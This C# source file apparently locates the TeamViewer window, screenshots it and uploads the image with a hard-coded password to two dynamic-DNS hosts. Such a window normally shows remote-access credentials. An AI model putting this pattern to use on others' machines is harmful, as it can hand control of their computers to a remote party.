using System;
using System.Collections.Generic;
using System.Collections.Specialized;
using System.Diagnostics;
using System.Drawing;
using System.Drawing.Imaging;
using System.IO;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using XP.Util.Json;

namespace XP.Sys.Progress
{

    /// <summary>
    /// 截图发送
    /// </summary>
    public class CaptureSend
    {
        public Action<string, string> LogEvent;



        public IntPtr Handle { get; set; }
        public Process WorkProcess { get; set; }



        public void OnSayLog(string tit, string cot)
        {
            LogEvent?.Invoke(tit, cot);

        }

        /// <summary>
        /// 截图
        /// </summary>
        public Bitmap Captrue { get; set; }

        public async Task StartAsync()
        {
            //testc();

            //if (null == Captrue) return;


            Handle = ProcessUtil.FindWindow(null, "TeamViewer");
            if (0 == Handle.ToInt32())
            {
                string Error = "没找到TeamViewer相关的进程，获得的句柄是：" + Handle;
                x.Say(Error);
                OnSayLog("没找到TeamViewer", Error);
                return;
            }
            OnSayLog("找到TeamViewer","");

            Captrue = Capturer.GetWindowCapture(Handle);
            if(null == Captrue)
            {
                string Error = "获取截图失败，获得的句柄是：" + Handle;
                x.Say(Error);
                OnSayLog("获取截图失败", Error);
                return;
            }
            OnSayLog("截图成功", "");

            SendFirstHost();
            OnSayLog("发送完成", "");
        }
        void testc()
        {
            char[] charArray;
            byte[] Filebuffer = new byte[1024 * 1024 * 1];
            byte[] ff2 = new byte[10];
            UnicodeEncoding uniEncoding = new UnicodeEncoding();

            using (MemoryStream ms = new MemoryStream(100))
            {
              
                byte[] firstString = uniEncoding.GetBytes(
        "Invalid file path characters are: ");

                ms.Write(firstString, 0, firstString.Length);



                int count = ms.Read(Filebuffer, 0, 15);
                int size2 = ms.Read(ff2, 0, ff2.Length);

                var bb2 = ms.ToArray();

                charArray = new char[uniEncoding.GetCharCount(
            Filebuffer, 0, count)];
                uniEncoding.GetDecoder().GetChars(
                    Filebuffer, 0, count, charArray, 0);
                Console.WriteLine(charArray);
            }

        }

        private void SendFirstHost()
        {
            string Host1 = "http://47n1212b70.qicp.vip/";
            bool flag = SendHost(Host1);
            OnSayLog($"第一个地址发送结果{(flag?"成功":"失败")}" , "地址：" + Host1);

            if (!flag)
            {
                SendSecondHost();
            }
        }

        private void SendSecondHost()
        {
            string Host1 = "http://471212k7i0.xicp.fun/";

            bool flag = SendHost(Host1);
            OnSayLog($"第二个地址发送结果{(flag ? "成功" : "失败")}", "地址：" + Host1);
        }

        protected bool SendHost(string host)
        {

            var ms = new MemoryStream();

            Captrue.Save(ms, ImageFormat.Png);
            NameValueCollection dict = new NameValueCollection();


            dict.Add("password", "GJPEWZSAVOHDAMYI");
       
            string Path = "api/Map/Update";

            string Response = HttpHelper.Upload(host + Path, ms, dict);
            x.Say("返回结果： " + Response);

            if (String.IsNullOrEmpty(Response))
            {
                OnSayLog("上传失败", $"传地址：{host}， 返回结果为{Response} ");
                return false;
            }
            var definition = new { Result = "err", Message = "" };


            var Msg1 = JsonHelper.ToAnyObj(Response, definition);
            if (null == Msg1 || "ok" != Msg1.Result)
            {
                OnSayLog("上传失败", $"传地址：{host}， 返回结果为{Response} ");
                // SendSecondHost();
                return false;

            }
            return true;
        }

    }
}
